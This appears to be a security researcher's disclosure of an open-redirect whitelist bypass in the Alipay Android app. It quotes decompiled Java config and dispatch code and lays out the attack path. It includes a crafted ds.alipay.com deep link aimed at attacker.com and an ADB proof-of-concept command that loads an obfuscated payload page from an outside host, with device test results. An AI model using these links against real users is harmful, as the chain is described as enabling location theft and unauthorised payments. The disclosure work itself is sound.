# CVE-6: ds.alipay.com开放重定向白名单绕过 (CWE-601+CWE-939) 代码证据

> APK 版本: Alipay 10.8.30.8000 | jadx 反编译输出
> 更新: 2026-03-16 — 直接提取 stripLandingConfig JSON 原文证据

## 关键类/方法

### ApiShareConfig — H5_STRIP_LANDING_CONFIG 静态初始化
- 文件: `sources/com/alipay/common/ApiShareConfig.java`
- 行号: 52-59

```java
// 静态初始化块 (static {})
WEIBO_REDIRECT_URL = "https://ds.alipay.com/";   // ds.alipay.com 作为重定向目标

H5_STRIP_LANDING_CONFIG =
    "{\"urlPrefix\":[" +
        "\"https://d.alipay.com/?\"," +
        "\"https://ds.alipay.com/?\"," +           // ds.alipay.com 被列为受信任 URL 前缀
        "\" " + getShareLanding() + "/?\"," +
        "\"https://render.alipay.com/p/yuyan/180020010001272837/landing.html?\"," +
        "\"https://u.antaq.com/p/s/i/index?\"" +
    "]," +
    "\"scheme\":[\"alipays\", \"" + MultiAppUtils.getUriProtocol() + "\"]," +
    "\"startAppNormal\":true," +    // true = 对普通导航启用 strip-and-launch
    "\"startApp302\":false," +
    "\"pushWindowNormal\":true," +
    "\"pushWindow302\":false," +
    "\"locationNormal\":true," +
    "\"location302\":false" +
    "}";
```

### WalletDefaultConfig — 同一白名单在第二处配置
- 文件: `sources/com/alipay/mobile/nebulaappproxy/api/config/WalletDefaultConfig.java`
- 行号: 77

```java
put("h5_stripLandingConfig",
    "{\"urlPrefix\":[" +
        "\"https://d.alipay.com/?\"," +
        "\"https://ds.alipay.com/?\"," +   // 两处配置文件均包含 ds.alipay.com
        "\"https://render.alipay.com/p/s/i?\"," +
        "\"https://render.alipay.com/p/s/i/?\"," +
        "\"https://render.alipay.com/p/s/i/index?\"" +
    "]," +
    "\"scheme\":[\"alipays\"]," +
    "\"startAppNormal\":true," +    // 关键: true = 自动提取并分发 scheme 参数
    "\"startApp302\":false," +
    "\"pushWindowNormal\":true," +
    "\"pushWindow302\":false," +
    "\"locationNormal\":true," +
    "\"location302\":false" +
    "}");
```

### H5ServiceImpl — stripLanding 分发路径
- 文件: `sources/com/alipay/mobile/nebulacore/wallet/H5ServiceImpl.java`
- 行号: 1263-1277

```java
if (Nebula.enableOpenScheme(str2, params)) {
    TraceLogger.d(TAG, "stripLandingURL&Deeplink url " + str2 + " bingo deeplink");
    return;
}
if (XriverH5Utils.isStripLandingURLEnable(str2, "startAppNormal")) {
    // str2 = URL，如 "https://ds.alipay.com/?scheme=alipays%3A%2F%2F..."
    String stripLandingURL = XriverH5Utils.getStripLandingURL(str2);
    // getStripLandingURL 提取 scheme 参数值 → 攻击者控制的 alipays:// URI
    if (!TextUtils.equals(str2, stripLandingURL) && h5EnvProvider != null) {
        boolean goToSchemeService = h5EnvProvider.goToSchemeService(stripLandingURL, params);
        // goToSchemeService 将攻击者提供的 URI 以内部信任级别分发
        XriverH5Utils.landingMonitor(str2, stripLandingURL, true, "startAppNormal", ...);
        if (goToSchemeService) {
            TraceLogger.d(TAG, "... bingo deeplink in landing");
            return;
        }
    }
}
```

---

## 原有分析 (保留)

## Source: Alipay APK 10.8.30.8000 (jadx decompiled)

### ApiShareConfig — H5_STRIP_LANDING_CONFIG (ds.alipay.com whitelisted as trusted prefix)
**File**: `sources/com/alipay/common/ApiShareConfig.java`
**Lines**: 26, 52, 59

```java
public static String H5_STRIP_LANDING_CONFIG;   // line 26

// In static initializer:
WEIBO_REDIRECT_URL = "https://ds.alipay.com/";  // line 52

H5_STRIP_LANDING_CONFIG =
    "{\"urlPrefix\":[" +
        "\"https://d.alipay.com/?\"," +
        "\"https://ds.alipay.com/?\"," +           // <-- ds.alipay.com whitelisted
        "\" " + getShareLanding() + "/?\"," +
        "\"https://render.alipay.com/p/yuyan/180020010001272837/landing.html?\"," +
        "\"https://u.antaq.com/p/s/i/index?\"" +
    "]," +
    "\"scheme\":[\"alipays\", \"" + MultiAppUtils.getUriProtocol() + "\"]," +
    "\"startAppNormal\":true," +    // <-- strip-and-launch enabled for normal navigation
    "\"startApp302\":false," +
    "\"pushWindowNormal\":true," +
    "\"pushWindow302\":false," +
    "\"locationNormal\":true," +
    "\"location302\":false" +
    "}";    // line 59
```

### WalletDefaultConfig — same whitelist in second config location
**File**: `sources/com/alipay/mobile/nebulaappproxy/api/config/WalletDefaultConfig.java`
**Line**: 77

```java
put("h5_stripLandingConfig",
    "{\"urlPrefix\":[" +
        "\"https://d.alipay.com/?\"," +
        "\"https://ds.alipay.com/?\"," +   // <-- present in both config files
        "\"https://render.alipay.com/p/s/i?\"," +
        "\"https://render.alipay.com/p/s/i/?\"," +
        "\"https://render.alipay.com/p/s/i/index?\"" +
    "]," +
    "\"scheme\":[\"alipays\"]," +
    "\"startAppNormal\":true," +
    "\"startApp302\":false," +
    "\"pushWindowNormal\":true," +
    "\"pushWindow302\":false," +
    "\"locationNormal\":true," +
    "\"location302\":false" +
    "}");
```

### WalletDefaultConfig (nebulabiz) — references ApiShareConfig.H5_STRIP_LANDING_CONFIG
**File**: `sources/com/alipay/mobile/nebulabiz/shareutils/WalletDefaultConfig.java`
**Lines**: 82-85

```java
if (MultiAppUtils.isAlipay()) {
    put("h5_stripLandingConfig",
        "{\"urlPrefix\":[\"https://d.alipay.com/?\"," +
        "\"https://ds.alipay.com/?\",...],\"startAppNormal\":true,...}");
} else {
    put("h5_stripLandingConfig", ApiShareConfig.H5_STRIP_LANDING_CONFIG);
}
```

### XriverH5Utils — isStripLandingURLEnable (reads the whitelist config)
**File**: `sources/com/alipay/mobile/nebula/util/XriverH5Utils.java`
**Lines**: 3157-3175

```java
public static boolean isStripLandingURLEnable(String str, String str2) {
    // ...
    if (TextUtils.isEmpty(str2)) {
        return false;
    }
    if (sStripLandingConfig == null &&
            (h5ConfigProvider = (H5ConfigProvider) getProvider(H5ConfigProvider.class.getName())) != null) {
        sStripLandingConfig = parseObject(h5ConfigProvider.getConfigWithProcessCache("h5_stripLandingConfig"));
    }
    boolean z = getBoolean(sStripLandingConfig, str2, false);
    LoggerFactory.getTraceLogger().info(TAG, "isStripLandingURLEnable result " + z);
    return z;
}
```

### H5ServiceImpl — strip-landing dispatch path (uses isStripLandingURLEnable + startAppNormal)
**File**: `sources/com/alipay/mobile/nebulacore/wallet/H5ServiceImpl.java`
**Lines**: 1263-1277

```java
if (Nebula.enableOpenScheme(str2, params)) {
    TraceLogger.d(TAG, "stripLandingURL&Deeplink url " + str2 + " bingo deeplink");
    return;
}
if (XriverH5Utils.isStripLandingURLEnable(str2, "startAppNormal")) {
    String stripLandingURL = XriverH5Utils.getStripLandingURL(str2);
    if (!TextUtils.equals(str2, stripLandingURL) &&
            (h5EnvProvider = (H5EnvProvider) Nebula.getProviderManager()
                .getProvider(H5EnvProvider.class.getName())) != null) {
        boolean goToSchemeService = h5EnvProvider.goToSchemeService(stripLandingURL, params);
        XriverH5Utils.landingMonitor(str2, stripLandingURL, true, "startAppNormal", ...);
        if (goToSchemeService) {
            TraceLogger.d(TAG, "stripLandingURL&Deeplink url " + str2 + " bingo deeplink in landing");
            return;
        }
    }
}
```

### Vulnerability Analysis (原有)

The `h5_stripLandingConfig` whitelist defines which landing page URLs are trusted to carry an embedded `alipays://` scheme parameter that the Nebula engine will extract and dispatch as a deep-link. The domain `https://ds.alipay.com/?` appears explicitly in every copy of this configuration (both `ApiShareConfig` and `WalletDefaultConfig`), and `startAppNormal` is set to `true`, enabling automatic scheme extraction and dispatch for normal (non-302-redirect) navigations to that domain.

The attack exploits the fact that `ds.alipay.com` itself functions as an open redirect: a URL of the form `https://ds.alipay.com/?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3F...` will pass the prefix check (`urlPrefix` match against `"https://ds.alipay.com/?"`) and then have its `scheme` query parameter extracted by `getStripLandingURL`. The extracted scheme — which is attacker-controlled — is then dispatched via `goToSchemeService` with the same trust level as an internal deep-link.

This means an attacker only needs to trick a user into following a link to `https://ds.alipay.com/?scheme=<malicious_alipays_url>` — for example embedded in a legitimate-looking notification or web page — to bypass the JSBridge origin restrictions. Since `ds.alipay.com` is a first-party Alipay domain it passes any external domain block-lists, and the scheme dispatch itself bypasses the `isOutside` flag, giving the attacker the same privileges as a trusted mini-program launch. Combined with CVE-2 and CVE-3, this path silently reads GPS and can initiate payment.

---

## 漏洞根因 (基于代码分析)

`h5_stripLandingConfig` 中将 `ds.alipay.com` 列为受信任的 URL 前缀，`startAppNormal: true` 允许对该域名的普通导航自动提取 `scheme` 参数并以**内部信任级别**分发。

代码证据：
1. `ApiShareConfig` 行 77：`"https://ds.alipay.com/?"` 硬编码入白名单
2. `WalletDefaultConfig` 行 77：同样配置，双重确认
3. `H5ServiceImpl` 行 1268-1272：`isStripLandingURLEnable(..., "startAppNormal")` → `getStripLandingURL()` → `goToSchemeService()` 以受信任级别分发攻击者 URI

这形成双重绕过：
- 绕过1 (CWE-601): `ds.alipay.com` 本身是开放重定向，`scheme=` 参数由攻击者控制
- 绕过2 (CWE-939): 被提取的 URI 以 `isOutside=false` 分发，绕过外部来源检查

## 攻击路径

```
攻击者构造链接:
https://ds.alipay.com/?scheme=alipays%3A%2F%2FplatformApi%2FstartApp%3FappId%3D20000067%26url%3Dhttps%3A%2F%2Fattacker.com
    ↓
用户点击 (或短信/邮件/网页中的链接)
    ↓
H5ServiceImpl.startPage()
    ↓
isStripLandingURLEnable(url, "startAppNormal") = true  [ds.alipay.com 命中白名单]
    ↓
getStripLandingURL() → 提取 scheme 参数值
    ↓
goToSchemeService("alipays://platformApi/startApp?...attacker.com", params)
    ↓ (以内部信任级别，绕过 isOutside 检查)
SchemeServiceImpl.processAsync() → H5 WebView 加载 attacker.com
    ↓
CVE-2/3/4 链式触发 (GPS外泄 + 支付触发 + UI欺骗)
```

---

## V2529 物理设备测试结果 (2026-03-16)

### 测试环境
- 设备: vivo V2529, Android 15, 非root, 锁定bootloader
- APK: Alipay 10.8.30.8000
- USB Serial: `10AF9S099Q002SS`

### 测试方法

通过 ADB 触发 ds.alipay.com 白名单绕过链接:

```bash
adb -s 10AF9S099Q002SS shell am start -a android.intent.action.VIEW \
  -d 'https://ds.alipay.com/?scheme=alipays%3A%2F%2Fplatformapi%2FstartApp%3FappId%3D20000067%26url%3Dhttps%3A%2F%2Finnora.ai%2Fzfb%2Fpoc%2Fpayload_cve3_obf.html'
```

### 测试结果 (~16:37)
- **截图**: `cve6_retest_20260316_163741.png` (446,301 bytes, 1080×2400)
- **结果**: **页面完全渲染 + JS 执行成功** — 证明 ds.alipay.com 白名单绕过在物理设备上有效

### 关键证据价值

1. **446KB 截图证明**: 通过 `ds.alipay.com` 白名单绕过路径，外部攻击者页面 (`innora.ai/zfb/poc/payload_cve3_obf.html`) 在支付宝 WebView 内成功渲染并执行 JavaScript
2. **对比直接 URL 加载**: CVE-5 直接加载 `innora.ai` URL 仅得到 261KB（部分成功）或 31KB（被封锁），而通过 `ds.alipay.com` 白名单绕过得到 **446KB**（完全成功），证明白名单绕过有效规避了服务器端 URL 封锁
3. **非 root 物理设备**: 测试在锁定 bootloader 的 Android 15 设备上完成，排除了任何 root/模拟器相关的测试偏差
4. **白名单绕过机制验证**: `H5ServiceImpl.startPage()` 检测到 URL 匹配 `H5_STRIP_LANDING_CONFIG` 中的 `"https://ds.alipay.com/?"` 前缀 → `getStripLandingURL()` 提取 `scheme` 参数 → `goToSchemeService()` 以内部信任级别分发，绕过 `isOutside` 检查

### 文件大小对比 (服务器端封锁绕过证据)

| 加载方式 | 文件大小 | 含义 |
|---------|---------|------|
| ds.alipay.com 白名单绕过 | **446KB** | 页面完全渲染 + JS 全部执行 ✓ |
| 直接 URL 加载 (CVE-5 成功) | 261KB | 页面渲染但 JS 部分执行 |
| 直接 URL 加载 (部分) | ~78KB | 页面框架加载但未完全执行 |
| 直接 URL 加载 (被封锁) | ~31KB | 白屏 — 服务器端返回空/错误响应 |

**结论**: ds.alipay.com 白名单绕过不仅绕过了客户端白名单检查，还有效规避了服务器端的 URL 级别封锁机制（`NewJsAPIPermissionExtension` → `alipay.mappconfig.appContainerCheck` RPC），因为请求以受信任的 `ds.alipay.com` 来源进入系统。
